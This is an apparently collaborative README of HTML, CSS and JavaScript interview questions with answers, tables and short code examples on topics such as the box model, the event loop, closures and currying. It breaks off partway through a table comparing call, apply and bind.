# FullStack Interview Preparation

A collection of common **HTML, CSS, JavaScript, React, Node.js, and TypeScript** interview questions with answers.  
This repo is collaborative — feel free to contribute more questions 🚀

---

## 📑 Table of Contents
- [HTML](#html)
- [CSS](#css)
- [JavaScript](#javascript)
- [React](#react)
- [Node.js](#nodejs)
- [TypeScript](#typescript)
- [Pattern Based Questions](#pattern-based-questions)

---

## 🟠 HTML

1. What is the difference between block, inline, and inline-block elements?
   - **Block:** Takes full width, starts on a new line (`<div>`, `<p>`, `<h1>`).
   - **Inline:** Takes only needed space, flows within text — ignores width/height (`<span>`, `<a>`, `<strong>`).
   - **Inline-block:** Flows inline (no new line) but respects width and height.

   | Property | Block | Inline | Inline-block |
   | --- | --- | --- | --- |
   | Starts on new line | ✅ Yes | ❌ No | ❌ No |
   | Respects width/height | ✅ Yes | ❌ No | ✅ Yes |
   | Margin/padding (all sides) | ✅ Yes | Left/Right only | ✅ Yes |
   | Examples | `<div>`, `<p>`, `<h1>` | `<span>`, `<a>`, `<strong>` | `<button>`, `<img>` |

   ```css
   div  { display: block; }         /* full width, forces new line */
   span { display: inline; }        /* flows with text, ignores width/height */
   img  { display: inline-block; }  /* inline flow + respects dimensions */
   ```

1. What are semantic HTML tags? Why are they important?
   - Tags that describe meaning, not just presentation (`<header>`, `<article>`, `<footer>`).
   - Improves accessibility & SEO.

1. Difference between `id` and `class` in HTML?
   - `id`: Unique identifier (used once per page).
   - `class`: Can be reused for multiple elements.

1. What is `<datalist>` in HTML?
   - Provides predefined suggestions for an `<input>` field — gives users autocomplete options while still allowing free text entry.
   ```html
   <input list="browsers" name="browser" placeholder="Choose or type...">
   <datalist id="browsers">
     <option value="Google Chrome">
     <option value="Mozilla Firefox">
     <option value="Microsoft Edge">
     <option value="Safari">
     <option value="Opera">
   </datalist>
   ```

1. What is HTML5?
   - **Semantic tags:** `<header>`, `<footer>`, `<article>`, `<section>`
   - **Multimedia:** `<video>`, `<audio>`
   - **APIs:** Geolocation, Local Storage, Canvas
   - **Web Workers**

1. What is the difference between `<script>`, `<script async>`, and `<script defer>`?

   | Type | Downloads | Execution |
   | --- | --- | --- |
   | `<script>` | Blocks HTML parsing | Immediately when encountered |
   | `<script async>` | Parallel (non-blocking) | As soon as downloaded (may interrupt parsing) |
   | `<script defer>` | Parallel (non-blocking) | After full HTML is fully parsed |

   - Use **`defer`** for most scripts — safe, order-preserved.
   - Use **`async`** for independent scripts (analytics, ads) that don't depend on DOM or other scripts.

   ```html
   <script src="app.js" defer></script>
   ```

1. What is the difference between `src` and `href`?
   - **`src`** (source): Embeds the resource directly — browser fetches and replaces the element. Blocks parsing when used in `<script>`.
   - **`href`** (hyperlink reference): Links to an external resource — creates a relationship without embedding.

   ```html
   <script src="app.js"></script>            <!-- embeds JS -->
   <img src="photo.jpg" alt="Photo" />       <!-- embeds image -->
   <link href="style.css" rel="stylesheet">  <!-- links CSS -->
   <a href="https://example.com">Link</a>   <!-- hyperlink -->
   ```

1. What are void (self-closing) elements in HTML?
   - Elements that **cannot have child nodes** and do not need a closing tag.
   - Examples: `<br>`, `<hr>`, `<img>`, `<input>`, `<link>`, `<meta>`, `<area>`, `<base>`, `<col>`, `<embed>`, `<source>`, `<track>`.

   ```html
   <input type="text" placeholder="Name" />
   <img src="logo.png" alt="Logo" />
   <br />
   ```

1. What is the DOM (Document Object Model)?
   - The DOM is a **programming interface** that represents an HTML page as a **tree of nodes** in memory. The browser parses HTML and builds this tree — JavaScript uses it to read, create, update, and delete elements dynamically.

   ```
   Document
   └── <html>
       ├── <head>
       │   └── <title>My Page</title>
       └── <body>
           ├── <h1 id="title">Hello</h1>
           └── <p class="text">World</p>
   ```

   ```js
   // Selecting elements
   document.getElementById("title").textContent = "New Title";
   document.querySelector(".text").style.color = "red";
   document.querySelectorAll("li").forEach(li => console.log(li.textContent));

   // Creating and inserting nodes
   const p = document.createElement("p");
   p.textContent = "Added dynamically";
   document.body.appendChild(p);

   // Removing an element
   document.querySelector("#title").remove();
   ```

   | DOM API | Description |
   | --- | --- |
   | `getElementById()` | Select element by `id` |
   | `querySelector()` | First match by CSS selector |
   | `querySelectorAll()` | All matches by CSS selector |
   | `createElement()` | Create a new element |
   | `appendChild()` | Add child node at the end |
   | `innerHTML` | Get/set HTML content |
   | `textContent` | Get/set text (no HTML parsing) |
   | `addEventListener()` | Attach event handler |

1. What are `data-*` attributes in HTML?
    - Custom attributes that store extra information on HTML elements — accessible in JavaScript via `element.dataset`.
    - Attribute names are automatically camelCased in `dataset`.

    ```html
    <button data-user-id="42" data-role="admin">Click Me</button>
    ```

    ```js
    const btn = document.querySelector("button");
    console.log(btn.dataset.userId); // "42"
    console.log(btn.dataset.role);   // "admin"
    ```

1. What is the difference between `<b>` & `<strong>`, and `<i>` & `<em>`?

    | Tag | Visual | Semantic Meaning |
    | --- | --- | --- |
    | `<b>` | Bold | None (purely visual) |
    | `<strong>` | Bold | Important content — emphasized by screen readers |
    | `<i>` | Italic | None (purely visual) |
    | `<em>` | Italic | Stressed content — tone changed by screen readers |

    - Prefer `<strong>` and `<em>` for **accessibility** and **SEO**.

1. What are `<meta>` tags and what are they used for?
    - Provide **metadata** about the HTML document — placed inside `<head>`, not displayed on the page.

    ```html
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Full-stack interview preparation guide">
    <meta property="og:title" content="Interview Guide">
    ```

1. What is the difference between `<section>`, `<article>`, and `<div>`?

    | Tag | Purpose |
    | --- | --- |
    | `<section>` | Groups related content with a theme — part of a larger whole (e.g., page chapters) |
    | `<article>` | Self-contained, independently reusable content (e.g., blog post, news card) |
    | `<div>` | Generic container — no semantic meaning, used for styling/layout only |

---

## 🔵 CSS

1. Difference between relative, absolute, fixed, and sticky positioning?
   - **Relative:** Positioned relative to itself.
   - **Absolute:** Positioned relative to nearest positioned ancestor.
   - **Fixed:** Always stays at the same place (relative to viewport).
   - **Sticky:** Switches between relative & fixed depending on scroll.

1. What is the difference between inline, internal, and external CSS?
   - **Inline:** Inside the element (`style=""`).
   - **Internal:** Inside `<style>` tag.
   - **External:** In a separate `.css` file.

1. Explain the difference between `em`, `rem`, `%`, and `px` in CSS.
   - `px`: Fixed pixels.
   - `em`: Relative to parent font-size.
   - `rem`: Relative to root (`html`) font-size.
   - `%`: Relative to parent container.

1. What is the CSS Box Model?
   - Every HTML element is a rectangular box made of four layers (inside out):
     1. **Content** — actual text or image
     1. **Padding** — space between content and border
     1. **Border** — surrounds the padding
     1. **Margin** — space outside the border (gap between elements)

   ```
   ┌──────────────────────────┐
   │          Margin          │
   │  ┌────────────────────┐  │
   │  │       Border       │  │
   │  │  ┌──────────────┐  │  │
   │  │  │   Padding    │  │  │
   │  │  │ ┌──────────┐ │  │  │
   │  │  │ │ Content  │ │  │  │
   │  │  │ └──────────┘ │  │  │
   │  │  └──────────────┘  │  │
   │  └────────────────────┘  │
   └──────────────────────────┘
   ```

   ```css
   div {
     width: 200px;      /* content width */
     padding: 10px;     /* inner space */
     border: 2px solid; /* border */
     margin: 20px;      /* outer space */
   }
   ```

   - `box-sizing: content-box` (default) — `width` applies to content only; padding/border add to total size.
   - `box-sizing: border-box` — `width` includes content + padding + border. Preferred for layouts.

   ```css
   * { box-sizing: border-box; } /* common CSS reset */
   ```

1. What are pseudo-classes and pseudo-elements?
   - **Pseudo-class** (`:`) — selects elements based on their **state** or **position** in the DOM.
   - **Pseudo-element** (`::`) — selects and styles a **specific part** of an element.

   | Type | Syntax | Examples |
   | --- | --- | --- |
   | Pseudo-class | `:` | `:hover`, `:focus`, `:nth-child()`, `:first-child`, `:checked`, `:disabled` |
   | Pseudo-element | `::` | `::before`, `::after`, `::first-line`, `::first-letter`, `::placeholder` |

   ```css
   /* Pseudo-classes */
   a:hover         { color: blue; }
   input:focus     { border-color: green; }
   li:nth-child(2) { background: #eee; }

   /* Pseudo-elements */
   p::first-letter  { font-size: 2em; }
   .btn::before     { content: "→ "; }
   input::placeholder { color: #aaa; }
   ```

1. What is Flexbox?
   - A **one-dimensional** layout model for arranging items in a row or column.
   - Parent becomes the **flex container**; direct children become **flex items**.

   ```css
   .container {
     display: flex;
     justify-content: center;  /* main axis alignment (horizontal by default) */
     align-items: center;      /* cross axis alignment (vertical) */
     gap: 16px;
     flex-wrap: wrap;          /* allow items to wrap to next line */
   }
   .item { flex: 1; }          /* grow/shrink equally */
   ```

   | Property | Description |
   | --- | --- |
   | `flex-direction` | `row` (default) or `column` |
   | `justify-content` | Main axis: `center`, `space-between`, `space-around` |
   | `align-items` | Cross axis: `center`, `flex-start`, `stretch` |
   | `flex-wrap` | Allow items to wrap |
   | `flex: 1` | Shorthand for grow, shrink, basis |

1. What is CSS Grid?
   - A **two-dimensional** layout system for placing items in rows and columns simultaneously.

   ```css
   .container {
     display: grid;
     grid-template-columns: repeat(3, 1fr); /* 3 equal columns */
     gap: 16px;
   }
   .item-wide { grid-column: 1 / 3; } /* span columns 1 to 3 */
   ```

   | Flexbox | Grid |
   | --- | --- |
   | 1D (row OR column) | 2D (row AND column) |
   | Content-driven | Layout-driven |
   | Navigation, toolbars | Page layouts, galleries |

1. What is CSS specificity?
   - A scoring system that determines which CSS rule applies when multiple rules target the same element.

   | Selector Type | Score |
   | --- | --- |
   | Inline style (`style=""`) | 1000 |
   | ID (`#id`) | 100 |
   | Class, attribute, pseudo-class (`.class`, `[attr]`, `:hover`) | 10 |
   | Element, pseudo-element (`div`, `::before`) | 1 |
   | Universal (`*`) | 0 |

   ```css
   p       { color: black; }  /* specificity: 1 */
   .text   { color: blue; }   /* specificity: 10 */
   #title  { color: red; }    /* specificity: 100 — wins */
   ```

   - Higher specificity wins. Equal specificity → last rule wins (cascade order).
   - `!important` overrides all — use sparingly.

1. What is the difference between `display: none`, `visibility: hidden`, and `opacity: 0`?

   | Property | Visible | Occupies Space | Events/Accessibility |
   | --- | --- | --- | --- |
   | `display: none` | ❌ | ❌ Removed from layout | ❌ |
   | `visibility: hidden` | ❌ | ✅ Holds space | ❌ |
   | `opacity: 0` | ❌ | ✅ Holds space | ✅ Still clickable |

   ```css
   .gone        { display: none; }         /* removed from layout entirely */
   .invisible   { visibility: hidden; }    /* hidden but holds space */
   .transparent { opacity: 0; }           /* invisible but still interactive */
   ```

1. What is `z-index` in CSS?
    - Controls the **stacking order** of positioned elements (`position` other than `static`).
    - Higher value = in front; lower = behind.

    ```css
    .modal   { position: fixed;    z-index: 1000; }
    .overlay { position: fixed;    z-index: 999;  }
    .content { position: relative; z-index: 1;    }
    ```

    - `z-index` only works on elements with `position: relative`, `absolute`, `fixed`, or `sticky`.

1. What are CSS variables (custom properties)?
    - Variables defined with `--` prefix, accessed with `var()`. Defined on `:root` to be globally available.

    ```css
    :root {
      --primary: #3498db;
      --font-base: 16px;
    }

    button {
      background: var(--primary);
      font-size: var(--font-base);
    }

    .dark-theme { --primary: #1a1a1a; } /* override per scope */
    ```

1. What is a CSS media query?
    - Applies styles conditionally based on device characteristics (screen width, orientation, etc.).

    ```css
    /* Mobile first */
    .container { width: 100%; }

    @media (min-width: 768px)  { .container { width: 750px; } }   /* tablet */
    @media (min-width: 1200px) { .container { width: 1170px; } }  /* desktop */

    @media (prefers-color-scheme: dark) {
      body { background: #000; color: #fff; }
    }
    ```

1. What is the difference between `margin` and `padding`?
    - **Padding:** Space **inside** the element (between content and border) — inherits background color.
    - **Margin:** Space **outside** the element (between border and neighbors) — always transparent.

    | Property | Location | Background | Collapses? |
    | --- | --- | --- | --- |
    | `padding` | Inside (content ↔ border) | ✅ Yes | ❌ No |
    | `margin` | Outside (border ↔ next element) | ❌ No | ✅ Yes (vertical) |

    ```css
    div { padding: 10px; margin: 20px; }
    ```

1. What is `overflow` in CSS?
    - Controls what happens when content is too large to fit its container.

    | Value | Behavior |
    | --- | --- |
    | `visible` (default) | Content overflows outside the box |
    | `hidden` | Overflow clipped and invisible |
    | `scroll` | Always shows scrollbars |
    | `auto` | Scrollbars only when needed |

    ```css
    .box     { width: 200px; height: 100px; overflow: auto; }
    .clamp   { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    ```

1. What is the difference between `transition` and `animation`?

    | Feature | `transition` | `animation` |
    | --- | --- | --- |
    | Trigger | Requires state change (hover, class toggle) | Runs automatically |
    | Keyframes | ❌ No | ✅ Yes (`@keyframes`) |
    | Loops | ❌ No | ✅ Yes (`infinite`) |

    ```css
    /* transition — triggered by :hover */
    .btn { transition: background 0.3s ease; }
    .btn:hover { background: blue; }

    /* animation — runs on its own */
    @keyframes spin {
      from { transform: rotate(0deg); }
      to   { transform: rotate(360deg); }
    }
    .loader { animation: spin 1s linear infinite; }
    ```

1. What is `calc()` in CSS?
    - Performs **math calculations** directly in CSS — can mix different units.

    ```css
    .sidebar { width: calc(100% - 250px); }
    .hero    { height: calc(100vh - 60px); } /* full viewport minus navbar height */
    .box     { padding: calc(1rem + 4px); }
    ```

1. What is `object-fit` in CSS?
    - Controls how a replaced element (`<img>`, `<video>`) fits within its container box.

    | Value | Behavior |
    | --- | --- |
    | `fill` (default) | Stretches to fill — may distort aspect ratio |
    | `contain` | Scales to fit — maintains ratio, may leave empty space |
    | `cover` | Scales to fill — maintains ratio, may crop edges |
    | `none` | Original size, no scaling |
    | `scale-down` | Smaller of `none` or `contain` |

    ```css
    img {
      width: 300px;
      height: 200px;
      object-fit: cover;       /* fills box, crops if needed — no distortion */
      object-position: center; /* focal point of the crop */
    }
    ```

---

## 🟡 JavaScript

1. Difference between `var`, `let`, and `const`?
   - `var`: Function-scoped, hoisted, can be redeclared.
   - `let`: Block-scoped, hoisted but not initialized, can be reassigned.
   - `const`: Block-scoped, cannot be reassigned.

1. What is hoisting in JavaScript?
   - JavaScript moves variable & function declarations to the top of scope before execution.

1. Difference between `==` and `===`?
   - `==`: Compares values after type conversion (loose equality).
   - `===`: Compares both value & type (strict equality).

1. Explain closures in JavaScript.
   - A closure is when a function remembers its lexical scope even if executed outside of it.

1. Spread operator vs Rest operator

   | Feature   | Spread Operator                 | Rest Operator                  |
   | --------- | ------------------------------- | ------------------------------ |
   | Purpose   | Expands elements                | Collects elements              |
   | Usage     | RHS (right-hand side)           | LHS (left-hand side)           |
   | Use cases | Arrays, objects, function calls | Function params, destructuring |

   ```js
   // Spread operator
   const arr1 = [1, 2, 3];
   const arr2 = [...arr1, 4, 5];
   console.log(arr2); // [1, 2, 3, 4, 5]

   // Rest operator
   const [first, ...rest] = [1, 2, 3, 4];
   console.log(first); // 1
   console.log(rest);  // [2, 3, 4]
   ```

1. `map()` vs `forEach()`

   | Feature      | `map()`             | `forEach()`    |
   | ------------ | ------------------- | -------------- |
   | Return value | New array           | `undefined`    |
   | Purpose      | Transform data      | Side effects   |
   | Chainable    | Yes                 | No             |
   | React usage  | ✅ Yes (JSX lists)  | ❌ No          |

1. Explain Microtask vs Macrotask.

   | Queue     | Description                                       | Examples                                            |
   | --------- | ------------------------------------------------- | --------------------------------------------------- |
   | Microtask | High-priority; runs before the next macrotask     | `Promise`, `queueMicrotask`, `MutationObserver`     |
   | Macrotask | Scheduled tasks; lower priority than microtasks   | `setTimeout`, `setInterval`, `setImmediate`, I/O    |

   - Microtasks always run before the next macrotask.

   <img width="1049" height="590" alt="image" src="https://github.com/user-attachments/assets/422ed303-58a9-4bae-9b44-4ddac4529cdb" />

1. `hasOwnProperty` vs `Object.hasOwn`

   | Feature                          | `obj.hasOwnProperty(key)` | `Object.hasOwn(obj, key)` |
   | -------------------------------- | ------------------------- | ------------------------- |
   | Type                             | Instance method           | Static method             |
   | Safe?                            | ❌ Can break              | ✅ Always safe            |
   | Prototype override risk          | YES                       | NO                        |
   | Works with `Object.create(null)` | ❌ No                     | ✅ Yes                    |
   | Recommended today                | No                        | Yes (ES2022+)             |

1. What is WeakMap in JavaScript?
   - A collection of key-value pairs where keys must be **objects** and are **weakly referenced** (can be garbage collected when no other references exist).
   ```js
   const wm = new WeakMap();
   let user = { name: "Bharat" };
   wm.set(user, "data");
   console.log(wm.get(user)); // "data"
   user = null; // entry may be removed automatically by garbage collector
   ```

1. `localStorage` vs `sessionStorage`
    - Both are part of the Web Storage API and store data in the browser as key-value pairs.

    | Feature       | `localStorage`                    | `sessionStorage`           |
    | ------------- | --------------------------------- | -------------------------- |
    | Expiry        | ❌ Never expires                  | ✅ Clears when tab closes  |
    | Scope         | Shared across tabs (same origin)  | Only same tab              |
    | Storage limit | ~5–10MB                           | ~5–10MB                    |
    | Persistence   | Long-term                         | Temporary                  |

1. JavaScript ES2022 New Features
    - **`.at()` Method** — Access elements using positive or negative index:
      ```js
      const arr = [10, 20, 30, 40];
      console.log(arr.at(1));   // 20
      console.log(arr.at(-1));  // 40
      ```
    - **`Object.hasOwn()`** — Safer way to check object properties (better than `hasOwnProperty`):
      ```js
      const obj = { name: "John" };
      console.log(Object.hasOwn(obj, "name")); // true
      ```
    - **`error.cause`** — Chain errors for better debugging:
      ```js
      try {
        JSON.parse("invalid");
      } catch (err) {
        throw new Error("Parsing failed", { cause: err });
      }
      ```

1. What is the Event Loop?
    - JavaScript is **single-threaded** but non-blocking. The event loop is the mechanism that allows JS to handle asynchronous operations without freezing the main thread.

    **Components:**
    - **Call Stack** — where JS executes code (LIFO). Synchronous code runs here.
    - **Web APIs** — browser-provided (setTimeout, fetch, DOM events). Offloaded here when encountered.
    - **Microtask Queue** — holds Promise callbacks, `MutationObserver`. Checked first after each task.
    - **Macrotask Queue** — holds `setTimeout`, `setInterval`, I/O callbacks. One task per loop tick.

    **How it works:**
    1. Execute all synchronous code on the Call Stack.
    1. When the stack is empty, drain the entire **Microtask Queue**.
    1. Pick **one** task from the Macrotask Queue and run it.
    1. Repeat from step 2.

    ```js
    console.log("1");                           // Call Stack → prints 1
    setTimeout(() => console.log("2"), 0);      // → Web API → Macrotask Queue
    Promise.resolve().then(() => console.log("3")); // → Microtask Queue
    console.log("4");                           // Call Stack → prints 4

    // Output order: 1, 4, 3, 2
    ```

    | Queue          | Examples                              | Priority |
    | -------------- | ------------------------------------- | -------- |
    | Call Stack     | All synchronous code                  | Runs first |
    | Microtask      | `Promise`, `queueMicrotask`           | Before next macrotask |
    | Macrotask      | `setTimeout`, `setInterval`, I/O      | After all microtasks |

1. What is Monkey Patching?
    - Modifying or extending existing objects, classes, or prototypes **at runtime** without changing the original source code.
    ```js
    // Adding a custom method to the built-in Array prototype
    Array.prototype.sum = function () {
      return this.reduce((acc, val) => acc + val, 0);
    };

    console.log([1, 2, 3].sum()); // 6
    ```

    | Aspect     | Detail                                                              |
    | ---------- | ------------------------------------------------------------------- |
    | Use cases  | Polyfills, mocking in tests, quick hotfixes                         |
    | Risks      | Naming conflicts with future native methods, hard to debug          |
    | Avoid when | Working with third-party libraries or shared codebases              |

    ```js
    // Common legitimate use — polyfill for older browsers
    if (!Array.prototype.at) {
      Array.prototype.at = function (index) {
        return index < 0 ? this[this.length + index] : this[index];
      };
    }
    ```

1. CommonJS vs ES Modules (ESM)

    | Feature            | CommonJS (CJS)                  | ES Modules (ESM)                     |
    | ------------------ | ------------------------------- | ------------------------------------ |
    | Syntax             | `require()` / `module.exports`  | `import` / `export`                  |
    | Loading            | Synchronous                     | Asynchronous                         |
    | Environment        | Node.js default (historically)  | Browser native; Node.js (`.mjs`)     |
    | Tree Shakeable     | ❌ No                           | ✅ Yes                               |
    | Static analysis    | ❌ No (dynamic)                 | ✅ Yes (resolved at parse time)      |
    | Top-level `await`  | ❌ Not supported                | ✅ Supported                         |

    ```js
    // CommonJS
    const fs = require("fs");
    module.exports = { myFunction };

    // ES Modules
    import fs from "fs";
    export { myFunction };
    ```

    - ESM is the modern standard — preferred for new projects and browser code.
    - CJS is still widely used in older Node.js codebases and packages.

1. Web Workers vs Service Workers

    | Feature              | Web Worker                        | Service Worker                          |
    | -------------------- | --------------------------------- | --------------------------------------- |
    | Purpose              | Background computation            | Network proxy / caching                 |
    | DOM access           | ❌ No                             | ❌ No                                   |
    | Lifecycle            | Tied to the page                  | Independent of the page                 |
    | Network intercept    | ❌ No                             | ✅ Yes (intercepts `fetch` requests)    |
    | Offline support      | ❌ No                             | ✅ Yes                                  |
    | Use case             | Heavy computation, image processing | PWAs, caching, background sync, push notifications |
    | Communication        | `postMessage`                     | `postMessage` + Fetch/Push events       |

    **Web Worker** — offload CPU-intensive tasks to a separate thread:
    ```js
    // main.js
    const worker = new Worker("worker.js");
    worker.postMessage({ numbers: [1, 2, 3, 4, 5] });
    worker.onmessage = (e) => console.log("Sum:", e.data);

    // worker.js
    self.onmessage = (e) => {
      const sum = e.data.numbers.reduce((a, b) => a + b, 0);
      self.postMessage(sum);
    };
    ```

    **Service Worker** — intercept and cache network requests:
    ```js
    // Register
    navigator.serviceWorker.register("/sw.js");

    // sw.js — cache-first strategy
    self.addEventListener("fetch", (event) => {
      event.respondWith(
        caches.match(event.request).then((cached) => cached || fetch(event.request))
      );
    });
    ```

1. What is JavaScript?
    - JavaScript is a **Single-Threaded** and **Synchronous** language by default.
    - **Single-Threaded** — can execute only one task at a time in a single main thread.
    - **Main Thread** — where JavaScript code executes one line at a time.
    - **Synchronous** — one task must complete before the next begins.
    - Handles async operations via Callbacks, Promises, and Async/Await using the Event Loop & Web APIs.

    | Main Thread | Call Stack |
    | --- | --- |
    | Single pipeline where all tasks execute | Data structure tracking which function is currently running |
    | Handles Code Execution + DOM + Events | Only handles Function Execution |
    | Whole JS code runs inside Main Thread | Only functions push & pop inside Call Stack |

    **Primitive vs Non-Primitive Data Types:**

    | Feature | Primitive | Non-Primitive |
    | --- | --- | --- |
    | Definition | Stores single immutable value | Stores collections or objects |
    | Types | String, Number, Boolean, Undefined, Null, Symbol, BigInt | Object, Array, Function, Date, RegExp, Map, Set |
    | Memory | Stack Memory | Heap Memory |
    | Access | By value | By reference |
    | Mutable? | ❌ Immutable | ✅ Mutable |
    | Copy | Copies the value itself | Copies the reference |

    ```js
    // Primitive
    let str = "Hello"
    str.length = 0 // TypeError: Cannot assign to read only property 'length'

    // Non-Primitive
    let arr = ["Hello", "World"]
    arr.length = 0
    console.log(arr) // []
    ```

1. How JavaScript Works?
    - When JavaScript runs, it creates a **Global Execution Context** inside the Call Stack.
    - Execution context has two phases:

    **1. Memory Allocation (Variable Environment Phase)**
    - Memory is set up for all variables and functions.
    - Variables are assigned `undefined` initially.
    - Functions are assigned their actual definition.

    **2. Code Execution (Thread of Execution Phase)**
    - Code executes line by line.
    - Variables get their actual values; functions are invoked.

    Each time a function is called, a **new execution context** is created and pushed onto the call stack on top of the global execution context.

1. What is Hoisting? (Detailed)
    - Variables and function **declarations** are moved to the top of their scope during compile phase.

    ```js
    // Function Declaration — hoisted entirely
    greet(); // "Hello!"
    function greet() { console.log("Hello!"); }

    // Function Expression — NOT hoisted
    greet(); // Error: greet is not a function
    var greet = function() { console.log("Hello!"); };

    // var — hoisted as undefined
    console.log(x); // undefined
    var x = 10;

    // let — hoisted but in Temporal Dead Zone
    console.log(a); // ReferenceError: Cannot access 'a' before initialization
    let a = 5;
    ```

    - `var`: hoisted and initialized as `undefined`.
    - `let` / `const`: hoisted but NOT initialized — accessing before declaration throws `ReferenceError` (Temporal Dead Zone).

1. Difference between `undefined` and `not defined`?
    - `undefined`: Variable is **declared** but not yet assigned a value — JavaScript auto-assigns this.
    - `not defined`: Variable is **never declared** — accessing it throws `ReferenceError`.

1. What is Lexical Environment?
    - Created whenever an execution context is created.
    - It is a combination of **local memory** (variable environment) + a **reference to the parent's lexical environment**.
    - The outer environment reference enables access to variables from parent scopes — the foundation of **closures**.

1. What is Scope?
    - Scope defines where you can access variables, functions, and objects in your code.

    | Scope | Lexical Environment |
    | --- | --- |
    | Area where variables are accessible | Real-time structure created during execution |
    | Static (decided at write time) | Dynamic (created at runtime) |
    | Does not store variables | Stores variables and outer references |

    **Types of Scope:**

    | Type | Description |
    | --- | --- |
    | Global Scope | Accessible everywhere |
    | Function Scope | Accessible only inside the function |
    | Block Scope | Accessible inside `{}` blocks only (`let` & `const`) |
    | Lexical Scope | Inner function can access outer function's variables |

1. What is Scope Chaining?
    - The process where JavaScript searches for variables from the current scope outward until it finds the variable or reaches the global scope.
    1. Search in **current scope** (Local).
    1. If not found, search in the **parent scope**.
    1. Continue up the chain to **Global Scope**.
    1. If still not found → `ReferenceError: not defined`.

1. What is `let`, `const`, and `var`? (Detailed)

    | Feature | `var` | `let` | `const` |
    | --- | --- | --- | --- |
    | Scope | Function Scope | Block Scope | Block Scope |
    | Reassign | ✅ Yes | ✅ Yes | ❌ No |
    | Redeclare | ✅ Yes | ❌ No | ❌ No |
    | Hoisting | ✅ `undefined` | Hoisted (TDZ) | Hoisted (TDZ) |
    | Initialization | Optional | Optional | Mandatory |

    **Types of Errors:**

    | Keyword | Error Type | When |
    | --- | --- | --- |
    | `let` | `ReferenceError` | Access before declaration |
    | `let` | `SyntaxError` | Redeclare variable |
    | `const` | `TypeError` | Reassign value |
    | `const` | `SyntaxError` | Missing initialization |
    | `const` | `ReferenceError` | Access before declaration |

1. What is Temporal Dead Zone (TDZ)?
    - The time period between the **declaration** of a `let`/`const` variable and its **initialization**, during which the variable cannot be accessed.
    - `let`/`const` variables are hoisted but kept in the TDZ until the initialization line is reached.
    - Accessing them during TDZ throws a `ReferenceError`.

1. What is Shadowing in JavaScript?
    - Occurs when a variable in a local scope has the same name as a variable in an outer scope — the inner variable **overrides (shadows)** the outer one inside its scope.
    - **Illegal Shadowing:** A `let`/`const` variable cannot shadow a `var` variable in the same scope.

    | Concept | Description | Priority |
    | --- | --- | --- |
    | Shadowing | Local variable overrides outer variable | Local Scope wins |
    | Scope Chain | Search from inner to outer scope | Closest match wins |

1. What is Closure? (Detailed)
    - A closure is a function **bundled together with references to its surrounding lexical environment**.
    - Gives a function access to its own scope, outer function variables, and global variables — even after the outer function has finished executing.
    - Closures are created every time a function is created in JavaScript.

    ```js
    function outer() {
      let outerVar = "I'm in the outer scope!";
      function inner() { console.log(outerVar); }
      return inner;
    }
    const closure = outer();
    closure(); // "I'm in the outer scope!"
    ```

1. Advantages of Closures
    - **Data Encapsulation** — create private variables inaccessible from outside.
    - **`setTimeout` with Loops** — preserve variable values inside loops.
    - **Currying** — closures are the foundation of curried functions.

    ```js
    // Data Encapsulation (Private Variable)
    function counter() {
      let count = 0;
      return function() { count++; console.log(count); };
    }
    const increment = counter();
    increment(); // 1
    increment(); // 2

    // setTimeout with loops — without closure (bug)
    for (var i = 1; i <= 3; i++) {
      setTimeout(() => console.log(i), i * 1000);
    }
    // Output: 4 4 4

    // With closure (fix)
    for (var i = 1; i <= 3; i++) {
      (function(j) {
        setTimeout(() => console.log(j), j * 1000);
      })(i);
    }
    // Output: 1 2 3
    ```

1. What is Currying?

    **Core Idea:** Currying = converting a function with multiple arguments into a sequence of functions, each taking one argument at a time.

    **Key transformation:**
    ```
    f(a, b, c)  →  f(a)(b)(c)
    ```

    ```js
    // Normal function
    function sum(a, b, c) { return a + b + c; }
    sum(1, 2, 3); // 6

    // Curried version
    function sum(a) {
      return function(b) {
        return function(c) { return a + b + c; };
      };
    }
    sum(1)(2)(3); // 6 — same result, different argument style
    ```

    **How it works internally — closures:**
    - First function stores `a` in its closure
    - Second function remembers `a` and takes `b`
    - Third function uses all three: `a + b + c`

    **Method 1 (closures) — Arrow function (most common in interviews):**
    ```js
    const multiply = (a) => (b) => (c) => a * b * c;
    multiply(2)(3)(4); // 24
    ```

    **Method 2 — Using `bind()` (partial application style):**
    ```js
    function multiply(a, b) { return a * b; }
    const double = multiply.bind(null, 2);
    double(5); // 10
    ```

    **Why currying is used:**

    *1. Reusability — create specialized functions from a general one:*
    ```js
    const add = (a) => (b) => a + b;
    const add10 = add(10);
    add10(5);  // 15
    add10(20); // 30
    ```

    *2. Avoid repetition — preset a fixed argument once, vary the rest.*

    *3. Functional programming — enables composable, pipeline-style code.*

    **Real-world use case — event handlers:**
    ```js
    const handleClick = (type) => (event) => {
      console.log(type, event);
    };
    button.addEventListener("click", handleClick("submit"));
    // "submit" is preset; the event object is passed by the browser
    ```

    **Generic curry helper:**
    ```js
    function curry(fn) {
      return function curried(...args) {
        if (args.length >= fn.length) return fn.apply(this, args);
        return curried.bind(this, ...args);
      };
    }
    const curriedSum = curry((a, b, c) => a + b + c);
    curriedSum(1)(2)(3); // 6
    ```

    | | Normal | Curried |
    | --- | --- | --- |
    | Call style | `sum(1, 2, 3)` | `sum(1)(2)(3)` |
    | Argument passing | All at once | One at a time |
    | Flexibility | Less reusable | More reusable |

    **Currying vs Partial Application:**
    - **Currying** — always one argument at a time (`f(a)(b)(c)`)
    - **Partial Application** — fix *some* arguments, pass the rest later (`f(a, b)(c)`)
    - Currying is a special case of partial application.

    **One-line intuition:** Currying = breaking one big function into small chained functions.

    **Interview answer:** "Currying is a functional programming technique where a function with multiple arguments is transformed into a sequence of functions, each taking one argument at a time. It uses closures to remember earlier arguments and enables reusability, partial application, and cleaner composable code."

1. What is `call()`, `apply()`, and `bind()`?

    All three methods control the value of `this` inside a function.

    - **`call()`** — Invokes the function **immediately**; arguments passed one by one.
      ```js
      // fn.call(thisArg, arg1, arg2)
      const person = { name: "Bharat" };
      function greet(age) { console.log(this.name, age); }
      greet.call(person, 25); // Bharat 25
      ```

    - **`apply()`** — Invokes the function **immediately**; arguments passed as an **array**.
      ```js
      // fn.apply(thisArg, [args])
      greet.apply(person, [25]); // Bharat 25
      ```

    - **`bind()`** — Does **not** execute immediately; returns a **new function** with `this` pre-bound.
      ```js
      // const newFn = fn.bind(thisArg, arg1)
      const boundFn = greet.bind(person, 25);
      boundFn(); // Bharat 25
      ```

    | Method | Execution | Arguments | Return Value |
    | --- | --- | --- | --- |
